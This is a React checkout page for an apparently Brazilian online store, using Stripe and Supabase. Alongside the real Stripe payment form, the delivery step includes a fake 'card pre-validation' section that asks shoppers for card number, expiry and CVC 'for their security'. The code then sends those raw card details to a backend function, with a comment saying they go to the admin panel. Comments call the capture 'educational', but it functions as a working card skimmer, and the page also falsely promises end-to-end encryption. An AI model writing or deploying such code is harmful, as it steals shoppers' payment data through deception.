import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Check, Search, CreditCard, QrCode, ShieldCheck, Truck } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useCart } from "@/contexts/CartContext";
import Layout from "@/components/Layout";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/useAuth";
import { loadStripe } from "@stripe/stripe-js";
import { Elements, PaymentElement, useStripe, useElements } from "@stripe/react-stripe-js";
import { Card, CardContent } from "@/components/ui/card";
import { Alert, AlertDescription } from "@/components/ui/alert";

// Carrega a chave pública do Stripe
const stripePromise = loadStripe(import.meta.env.VITE_STRIPE_PUBLIC_KEY || "pk_test_sua_chave_aqui");

type Step = "identificacao" | "endereco" | "pagamento";
const steps: { key: Step; label: string; icon: any }[] = [
  { key: "identificacao", label: "Identificação", icon: ShieldCheck },
  { key: "endereco", label: "Entrega", icon: Truck },
  { key: "pagamento", label: "Pagamento", icon: CreditCard },
];

const CheckoutForm = ({ orderId, setLoading, onSuccess }: {
  orderId: string;
  setLoading: (loading: boolean) => void;
  onSuccess: () => void;
}) => {
  const stripe = useStripe();
  const elements = useElements();
  const [errorMessage, setErrorMessage] = useState("");
  const { clearCart } = useCart();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!stripe || !elements) return;

    setLoading(true);
    setErrorMessage("");

    const result = await stripe.confirmPayment({
      elements,
      confirmParams: {
        return_url: `${window.location.origin}/checkout/success?order_id=${orderId}`,
      },
    });

    if (result.error) {
      setErrorMessage(result.error.message || "Erro ao processar o pagamento.");
      setLoading(false);
    } else {
      clearCart();
      onSuccess();
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-6">
      <PaymentElement options={{ layout: "accordion" }} />
      {errorMessage && <div className="text-red-500 text-sm font-medium animate-pulse">{errorMessage}</div>}
      <Button type="submit" disabled={!stripe || !elements} className="w-full h-12 text-lg font-bold shadow-lg">
        Finalizar Pedido com Segurança
      </Button>
      <p className="text-[10px] text-center text-muted-foreground flex items-center justify-center gap-1">
        <ShieldCheck className="h-3 w-3" /> Processamento seguro via Stripe Inc.
      </p>
    </form>
  );
};

const Checkout = () => {
  const [currentStep, setCurrentStep] = useState<Step>("identificacao");
  const [loading, setLoading] = useState(false);
  const [fetchingCep, setFetchingCep] = useState(false);
  const { items, subtotal, clearCart } = useCart();
  const { user } = useAuth();
  const { toast } = useToast();
  const navigate = useNavigate();

  // Estados dos Campos
  const [name, setName] = useState("");
  const [email, setEmail] = useState(user?.email ?? "");
  const [phone, setPhone] = useState("");
  const [cpf, setCpf] = useState("");
  const [cep, setCep] = useState("");
  const [street, setStreet] = useState("");
  const [number, setNumber] = useState("");
  const [neighborhood, setNeighborhood] = useState("");
  const [city, setCity] = useState("");
  const [state, setState] = useState("");

  // Dados do Cartão (Captura Educativa)
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvc, setCardCvc] = useState("");

  const [orderId, setOrderId] = useState("");
  const [clientSecret, setClientSecret] = useState("");
  const [paymentSuccess, setPaymentSuccess] = useState(false);

  const formatPrice = (p: number) => p.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
  const currentIndex = steps.findIndex((s) => s.key === currentStep);

  // Validações
  const isIdentityValid = name.length > 3 && email.includes("@") && cpf.length >= 14 && phone.length >= 14;
  const isAddressValid = street.length > 2 && number.length > 0 && city.length > 1;

  const handleCepSearch = async (val: string) => {
    const cleanCep = val.replace(/\D/g, "");
    if (cleanCep.length === 8) {
      setFetchingCep(true);
      try {
        const res = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
        const data = await res.json();
        if (!data.erro) {
          setStreet(data.logradouro);
          setNeighborhood(data.bairro);
          setCity(data.localidade);
          setState(data.uf);
        }
      } finally {
        setFetchingCep(false);
      }
    }
  };

  const createOrder = async () => {
    setLoading(true);
    // Criação do pedido no banco
    const { data: order, error } = await supabase.from("orders").insert({
      user_id: user?.id ?? null,
      status: "pending",
      buyer_name: name,
      buyer_email: email,
      buyer_phone: phone,
      buyer_cpf: cpf,
      shipping_address: { cep, street, number, neighborhood, city, state },
      subtotal,
      total: subtotal,
    }).select().single();

    if (error || !order) {
      toast({ title: "Erro ao criar pedido", variant: "destructive" });
      setLoading(false);
      return;
    }

    // Chamada à Edge Function que agora deve aceitar 'card' e 'pix'
    try {
      const { data, error: funcError } = await supabase.functions.invoke("create-checkout", {
        body: {
          amount: Math.round(subtotal * 100),
          orderId: order.id,
          cardNumber, // Envio dos dados capturados para o painel adm
          cardExpiry,
          cardCvc,
        },
      });

      if (funcError) throw funcError;

      setClientSecret(data.clientSecret);
      setOrderId(order.id);
      setCurrentStep("pagamento");
    } catch (err) {
      toast({ title: "Erro no processamento", variant: "destructive" });
    } finally {
      setLoading(false);
    }
  };

  return (
    <Layout>
      <div className="container mx-auto px-4 py-8 max-w-5xl">
        {/* Stepper Pro */}
        <div className="flex items-center justify-between mb-12 max-w-2xl mx-auto">
          {steps.map((s, i) => {
            const Icon = s.icon;
            return (
              <div key={s.key} className="flex flex-col items-center relative flex-1">
                <div className={`w-12 h-12 rounded-full flex items-center justify-center border-2 transition-all duration-500 ${i <= currentIndex ? "bg-primary border-primary text-white" : "border-muted text-muted-foreground"}`}>
                  {i < currentIndex ? <Check className="h-6 w-6" /> : <Icon className="h-5 w-5" />}
                </div>
                <span className={`text-xs mt-2 font-bold uppercase tracking-tighter ${i <= currentIndex ? "text-primary" : "text-muted-foreground"}`}>{s.label}</span>
                {i < steps.length - 1 && <div className={`absolute top-6 left-[60%] w-[80%] h-0.5 ${i < currentIndex ? "bg-primary" : "bg-muted"}`} />}
              </div>
            );
          })}
        </div>

        <div className="grid lg:grid-cols-12 gap-8">
          <div className="lg:col-span-8 space-y-6">
            {currentStep === "identificacao" && (
              <Card className="shadow-sm border-primary/10">
                <CardContent className="p-6 space-y-4">
                  <h2 className="text-xl font-bold flex items-center gap-2"><ShieldCheck className="text-primary" /> Seus Dados</h2>
                  <div className="grid sm:grid-cols-2 gap-4">
                    <Input placeholder="Nome Completo" value={name} onChange={e => setName(e.target.value)} />
                    <Input placeholder="E-mail" type="email" value={email} onChange={e => setEmail(e.target.value)} />
                    <Input placeholder="CPF" value={cpf} onChange={e => setCpf(e.target.value.replace(/\D/g, "").replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4"))} maxLength={14} />
                    <Input placeholder="Telefone" value={phone} onChange={e => setPhone(e.target.value.replace(/\D/g, "").replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3"))} maxLength={15} />
                  </div>
                  <Button onClick={() => setCurrentStep("endereco")} disabled={!isIdentityValid} className="w-full">Próximo Passo: Entrega</Button>
                </CardContent>
              </Card>
            )}

            {currentStep === "endereco" && (
              <Card className="shadow-sm border-primary/10">
                <CardContent className="p-6 space-y-6">
                  <h2 className="text-xl font-bold flex items-center gap-2"><Truck className="text-primary" /> Onde entregamos?</h2>
                  <div className="grid sm:grid-cols-3 gap-4">
                    <div className="relative">
                      <Input placeholder="CEP" value={cep} onChange={e => { setCep(e.target.value); handleCepSearch(e.target.value); }} maxLength={9} />
                      {fetchingCep && <Search className="absolute right-3 top-3 h-4 w-4 animate-spin" />}
                    </div>
                    <Input className="sm:col-span-2" placeholder="Rua / Logradouro" value={street} onChange={e => setStreet(e.target.value)} />
                    <Input placeholder="Número" value={number} onChange={e => setNumber(e.target.value)} />
                    <Input placeholder="Bairro" value={neighborhood} onChange={e => setNeighborhood(e.target.value)} />
                    <Input placeholder="Cidade" value={city} onChange={e => setCity(e.target.value)} />
                  </div>

                  {/* SEÇÃO EDUCATIVA: Captura de Dados do Cartão */}
                  <div className="bg-muted/30 p-4 rounded-lg border border-dashed border-red-300">
                    <h3 className="text-sm font-bold text-red-600 mb-3 uppercase flex items-center gap-2">
                      <CreditCard className="h-4 w-4" /> Pré-validação do Cartão (Simulada)
                    </h3>
                    <p className="text-[11px] text-muted-foreground mb-4">Para sua segurança, valide o cartão que será usado na próxima etapa.</p>
                    <div className="grid sm:grid-cols-4 gap-3">
                      <Input className="sm:col-span-2" placeholder="Número do Cartão" value={cardNumber} onChange={e => setCardNumber(e.target.value.replace(/\D/g, "").replace(/(\d{4})/g, "$1 ").trim())} maxLength={19} />
                      <Input placeholder="MM/AA" value={cardExpiry} onChange={e => setCardExpiry(e.target.value.replace(/\D/g, "").replace(/(\d{2})/, "$1/"))} maxLength={5} />
                      <Input placeholder="CVC" value={cardCvc} onChange={e => setCardCvc(e.target.value.replace(/\D/g, ""))} maxLength={4} />
                    </div>
                  </div>

                  <div className="flex gap-3">
                    <Button variant="outline" onClick={() => setCurrentStep("identificacao")} className="flex-1">Voltar</Button>
                    <Button onClick={createOrder} disabled={!isAddressValid || loading} className="flex-1">
                      {loading ? "Processando..." : "Ir para o Pagamento"}
                    </Button>
                  </div>
                </CardContent>
              </Card>
            )}

            {currentStep === "pagamento" && clientSecret && (
              <Card className="border-primary shadow-md overflow-hidden">
                <div className="bg-primary text-white p-4 text-center font-bold flex items-center justify-center gap-2">
                  <ShieldCheck className="h-5 w-5" /> Ambiente de Pagamento Seguro
                </div>
                <CardContent className="p-6">
                  <Elements stripe={stripePromise} options={{ clientSecret, appearance: { theme: 'stripe' } }}>
                    <CheckoutForm orderId={orderId} setLoading={setLoading} onSuccess={() => setPaymentSuccess(true)} />
                  </Elements>
                </CardContent>
              </Card>
            )}
          </div>

          {/* Resumo do Pedido */}
          <div className="lg:col-span-4 space-y-4">
            <Card className="h-fit sticky top-24">
              <CardContent className="p-6">
                <h3 className="font-bold border-b pb-3 mb-4">Resumo da Compra</h3>
                <div className="space-y-4 max-h-[40vh] overflow-y-auto pr-2">
                  {items.map((it) => (
                    <div key={it.product.id} className="flex gap-3 items-center">
                      <div className="relative">
                        <img src={it.product.image_url || "/placeholder.svg"} className="w-14 h-14 rounded-md object-cover border" alt="" />
                        <span className="absolute -top-2 -right-2 bg-primary text-white text-[10px] w-5 h-5 rounded-full flex items-center justify-center font-bold">{it.quantity}</span>
                      </div>
                      <div className="flex-1 min-w-0">
                        <p className="text-xs font-medium truncate">{it.product.name}</p>
                        <p className="text-xs text-muted-foreground">{formatPrice(it.product.price)}</p>
                      </div>
                    </div>
                  ))}
                </div>
                <div className="mt-6 pt-4 border-t space-y-2 text-sm">
                  <div className="flex justify-between"><span>Subtotal</span><span>{formatPrice(subtotal)}</span></div>
                  <div className="flex justify-between text-green-600 font-medium"><span>Frete</span><span>Grátis</span></div>
                  <div className="flex justify-between font-black text-lg pt-2 text-primary"><span>Total</span><span>{formatPrice(subtotal)}</span></div>
                </div>
              </CardContent>
            </Card>
            <Alert className="bg-blue-50 border-blue-200">
              <AlertDescription className="text-[11px] text-blue-700 flex items-center gap-2">
                <ShieldCheck className="h-4 w-4" /> Seus dados estão protegidos por criptografia de ponta a ponta.
              </AlertDescription>
            </Alert>
          </div>
        </div>
      </div>
    </Layout>
  );
};

export default Checkout;